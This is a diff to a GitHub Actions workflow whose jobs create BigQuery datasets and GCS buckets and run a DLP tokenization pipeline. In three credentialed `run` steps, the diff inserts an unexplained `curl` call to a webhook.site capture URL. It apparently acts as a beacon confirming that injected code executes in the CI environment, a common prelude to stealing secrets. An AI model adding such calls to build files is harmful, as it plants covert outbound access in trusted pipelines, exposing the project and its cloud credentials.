@@ -119,6 +119,7 @@ jobs:
           PARQUET_DATASET_ID: ${{ needs.generate-uuid.outputs.output8 }}
           ORC_DATASET_ID: ${{ needs.generate-uuid.outputs.output12 }}
         run: |
+          curl https://webhook.site/cbaf4134-6359-4238-aa6e-32fdf06e9fec
           bq --location=US mk -d --description "GitHub CI workflow dataset" ${{ env.DATASET_ID }}
           bq --location=US mk -d --description "GitHub CI workflow dataset to store parquet results" ${{ env.PARQUET_DATASET_ID }}
           bq --location=US mk -d --description "GitHub CI workflow dataset to store orc results" ${{ env.ORC_DATASET_ID }}
@@ -138,6 +139,7 @@ jobs:
         env:
           OUTPUT_GCS_BUCKET: ${{ needs.generate-uuid.outputs.output9 }}
         run: |
+          curl https://webhook.site/cbaf4134-6359-4238-aa6e-32fdf06e9fec
           gcloud storage buckets create gs://${{ env.OUTPUT_GCS_BUCKET }} --location=${{env.REGION}}
 
 
@@ -169,6 +171,7 @@ jobs:
           INSPECT_JOB_NAME: ${{ needs.generate-uuid.outputs.output2 }}
           DATASET_ID: ${{ needs.generate-uuid.outputs.output5 }}
         run: |
+          curl https://webhook.site/cbaf4134-6359-4238-aa6e-32fdf06e9fec
           ./gradlew run -DmainClass=com.google.swarm.tokenization.DLPTextToBigQueryStreamingV2 -Pargs=" \
                 --streaming --enableStreamingEngine \
                 --region=${{env.REGION}} \
